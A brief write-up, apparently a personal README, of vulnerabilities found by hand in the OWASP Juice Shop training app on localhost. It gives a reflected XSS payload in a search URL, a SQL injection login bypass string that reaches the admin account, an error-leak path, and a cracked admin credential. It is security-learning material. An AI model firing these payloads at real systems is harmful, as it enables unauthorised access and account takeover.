# Owasp_juice_shop

Vulns found manually exploiring the application (with no tools) 

## XSS: 
```
http://127.0.0.1:3000/#/search?q=hello%22%3E%3Cimg%2Fsrc%3Dx%20onerror%3Dalert(document.domain)%3E
```

## SQLI Auth bypass
```
' or 1=1-- -
```
On username field. Logs into admin account.
`url: http://127.0.0.1:3000/#/login`

## Express Error (info leak)(unexpected path)
```
http://127.0.0.1:3000/api/Score%20Board
```
![image](https://user-images.githubusercontent.com/5285547/214612212-7998421f-227f-4693-b479-e1c401d4b9f9.png)

## Using burp to capture the upload photo to wall. 

http://127.0.0.1:3000/dashboard#/photo-wall

![image](https://user-images.githubusercontent.com/5285547/214612717-51d87c1d-6155-4afc-89c6-af91b9d36698.png)

---

Found JWT token 

![image](https://user-images.githubusercontent.com/5285547/214613566-012e43c1-4f5d-4c5a-b4c2-24c7f1b0df34.png)

admin password showing cracked. 

```
admin:admin123
```


